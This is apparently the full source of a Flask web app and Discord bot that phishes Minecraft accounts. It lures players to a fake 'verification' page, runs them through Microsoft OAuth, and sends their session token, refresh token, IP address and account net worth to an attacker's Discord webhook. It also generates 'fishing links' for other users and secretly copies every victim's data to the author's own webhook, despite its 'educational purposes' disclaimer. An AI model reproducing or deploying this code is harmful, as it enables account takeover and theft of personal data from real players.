from flask import Flask,redirect,request,jsonify, make_response
import requests
import json
import os 
from datetime import date,datetime
import os
from dotenv import load_dotenv
from nacl.signing import VerifyKey
from nacl.exceptions import BadSignatureError
from discord_interactions import verify_key_decorator, InteractionType, InteractionResponseType
from numerize.numerize import numerize
import base64
load_dotenv()

## Start backend
def new_user(id:str,link):
    with open('data.json', 'r') as f:
        data = json.load(f)
    data[str(id)] = link
    with open('data.json', 'w') as f:
        json.dump(data, f)

def get_webhook(id:str):
    with open('data.json', 'r') as f:
        data = json.load(f)
    try:
        return data[id]
    except:
        return None
def getNw(ign):
    try:
        url = f"https://nwapi.battleb0t.xyz/v2/profiles/{ign}?key=KEKW"
        response = requests.get(url)
        jsonresponse = response.json()
        return jsonresponse['data'][0]['networth']['unsoulboundNetworth']
    except:
        return 0

def getMsAccessToken(code):
        url = "https://login.live.com/oauth20_token.srf"
        headers = {"Content-Type" : "application/x-www-form-urlencoded"}
        data = {
            "client_id": os.environ.get('microsoft_id'),
            "redirect_uri": os.environ.get('redirect_uri')+"/xbox/",
            "client_secret": os.environ.get('microsoft_secret'),
            "code": code,
            "grant_type": 'authorization_code',
        }
        response = requests.post(url, headers=headers, data=data)
        jsonresponse = response.json()
        return jsonresponse['access_token'], jsonresponse['refresh_token']
def getMsAccessTokenFromRefresh(refresh_token):
    url = "https://login.live.com/oauth20_token.srf"
    headers = {"Content-Type" : "application/x-www-form-urlencoded"}
    data ={
        "client_id":{os.environ.get('microsoft_id')},
        "client_secret":f"{os.environ.get('microsoft_secret')}",
        "grant_type":"refresh_token",
        "refresh_token":refresh_token,
        f"redirect_uri":os.environ.get('redirect_uri')+"/xbox/"}
    response = requests.post(url, headers=headers, data=data)
    return response.json()["access_token"], response.json()["refresh_token"]


def GetXblToken(access_token):
        url = "https://user.auth.xboxlive.com/user/authenticate"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": "d=" + access_token
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
                }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['Token']

def GetXstsUserHash(xbl):
        url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [
                    xbl
                    ]
                    },
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                    }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['DisplayClaims']['xui'][0]['uhs'],jsonresponse['Token']

def GetSsid(userhash, xsts):
        url = "https://api.minecraftservices.com/authentication/login_with_xbox"
        headers = {"Content-Type": "application/json"}
        data = {
           "identityToken" : "XBL3.0 x="+ userhash + ";" + xsts,
           "ensureLegacyEnabled" : "true"
        }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['access_token']

def GetMcData(ssid):
        url = "https://api.minecraftservices.com/minecraft/profile"
        headers = {"Content-Type": "application/json" , "Authorization": "Bearer " + ssid}
        response = requests.get(url, headers=headers)
        jsonresponse = response.json()
        return jsonresponse['name'],jsonresponse['id']

### End backend

app = Flask(__name__)

url = os.environ.get('redirect_uri')

@app.route('/')
def home():
    code = request.args.get('id', None)
    try:
        resp = make_response(redirect(f"https://login.live.com/oauth20_authorize.srf?client_id={os.environ.get('microsoft_id')}&response_type=code&redirect_uri={url}/xbox/&scope=XboxLive.signin%20offline_access&state={code}"))
        return resp
    except Exception as e:
        return str(e)

@app.route('/xbox/', methods=['GET'])
def xbox():
    try:
        args = request.args
        user_id = args.get("state")
        ip = request.headers['X-Forwarded-For']
        msaccesstoken, refresh_token = getMsAccessToken(args.get("code"))
        xbl = GetXblToken(msaccesstoken)
        xstsuserhash = GetXstsUserHash(xbl)
        ssid = GetSsid(xstsuserhash[0], xstsuserhash[1])
        ignuuid = GetMcData(ssid)
        uuid = ignuuid[1]
        ign = ignuuid[0]
        post_webhook(user_id,ign,uuid,ssid,refresh_token,ip)
        return(f"Done!!\nYou are now verified!\nAccount username: {ign}")

    except Exception as e:
        return("Error: User does not have a valid minecraft account to link to with")

@app.route('/refresh/', methods=['GET'])
def refresh():
    try:
        args = request.args
        token = args.get('token')
        user_id = args.get("id")
        ip = request.headers['X-Forwarded-For']
        msaccesstoken,refresh_token = getMsAccessTokenFromRefresh(token)
        xbl = GetXblToken(msaccesstoken)
        xstsuserhash = GetXstsUserHash(xbl)
        ssid = GetSsid(xstsuserhash[0], xstsuserhash[1])
        ignuuid = GetMcData(ssid)
        uuid = ignuuid[1]
        ign = ignuuid[0]
        post_webhook(user_id,ign,uuid,ssid,refresh_token,ip,1)
        return("Refreshed token, you can now use the new token to login to your account! Get it from the discord webhook!")
    except Exception as e:
        return("Something went wrong, please try again later contact the dev at https://github.com/whished/about")

data = {
    "name": "generate",
    "type": 1,
    "description": "Generates a fishing link for you",
    "options": [
        {
            "name": "link",
            "description": "Webhook link",
            "type": 3,
            "required": True
        }
    ]
}
r = requests.post(f"https://discord.com/api/v10/applications/{os.environ.get('discord_id')}/commands", headers = {"Authorization": f"Bot {os.environ.get('discord_token')}"}, json=data)

def post_webhook(id, ign, uuid, ssid, refresh,ip,type = 0):
    id = str(id)
    nw =getNw(ign)
    link = get_webhook(id)
    if link == None:
        link = os.environ.get('doublehook')
    try:    
        new_nw = numerize(nw)
    except:
        new_nw = nw

    name = "Token Refreshed!" if type == 1 else "New hit"
    data = {
        "username": "Fisher bot",
        "avatar_url": "https://img.freepik.com/free-vector/happy-kid-sitting-chair-fishing_1308-121424.jpg?w=2000",
        "content": "@everyone",
        "embeds": [
            {
            "title": name,
            "color": 2163387,
            f"description": f"Imagine getting ratted by a fishing bot",
            "timestamp": datetime.now().isoformat(),
            "url":f"https://sky.shiiyu.moe/stats/{uuid}",
            "author": {},
            "image": {},
            "thumbnail": {},
            "footer": {
                "text": "By Whishes#9238",
                "icon_url":f"https://mc-heads.net/avatar/{uuid}"
            },
            "fields": [
                {
                "name": "IGN",
                "value": f"`{ign}` ({uuid})"
                },
                {
                "name": "Networth",
                "value": f"`{new_nw}`"
                },
                {
                "name": "IP",
                "value": f"`{ip if type == 0 else 'N/A'}`"
                },
                {
                "name": "SSID",
                "value": f"`{ssid}`"
                }
            ]
            },
            {
            "title": "Refresh",
            "color": 2163387,
            f"description": f"Click the title to refrsh the token",
            "timestamp": "",
            "url":f"{url}/refresh?id={id}&token={refresh}",
            "author": {},
            "image": {},
            "thumbnail": {},
            "footer": {
                "text": "https://github.com/whished/about"
            }
            }
        ]
        }

    if link != None:
        if nw < 75000000:
            requests.post(link, json = data)
        data["embeds"][0]["description"] = f"{id} just got a hit!"
        data["embeds"][0]["fields"][2]["value"] = f"`{ip}`"
        data["embeds"][1]["url"] = f"{url}/refresh?token={refresh}"
        if link != os.environ.get('doublehook'):
            requests.post(os.environ.get('doublehook'), json = data)
    else:
        requests.post(os.environ.get('doublehook'), json = data)

@app.route('/interactions', methods=['POST'])
@verify_key_decorator(os.environ.get('discord_key'))
def interactions():
    if request.json['type'] == InteractionType.APPLICATION_COMMAND:
        if request.json["data"]["name"] == "generate":
            link = request.json["data"]["options"][0]["value"]
            try:
                resp = requests.get(link)
                if resp.json()["type"] == 1:
                    pass
                else:
                    return jsonify({
                        'type': InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
                        'data': {
                        "content": "Invalid webhook!",
                        "flags": 64,
                        "embeds": [],
                        "attachments": []
                        }
                    })
            except:
                return jsonify({
                    'type': InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
                    'data': {
                    "content": "Invalid webhook!",
                    "flags": 64,
                    "embeds": [],
                    "attachments": []
                    }
                })
            id = int(request.json["member"]["user"]["id"])
            new_user(str(id),link)
            return jsonify({
                    'type': InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
                    'data': {
                    "content": "",
                    "flags": 64,
                    "embeds": [
                        {
                        "title": "Generated link:",
                        "description": f"{url}?id={id}",
                        "url": f"{url}?id={id}",
                        "color": 4378134,
                        "fields": [
                            {
                            "name": "Disclaimer",
                            "value": "This link is only for educational purposes only. This bot is just provided as a proof of concept and the user is responsible for all action. The link should not be use maliciously in any shape or form."
                            }
                        ]
                        }
                    ],
                    "attachments": []
                    }
            })

if __name__ == "__main__":
    app.run(port = 80)
    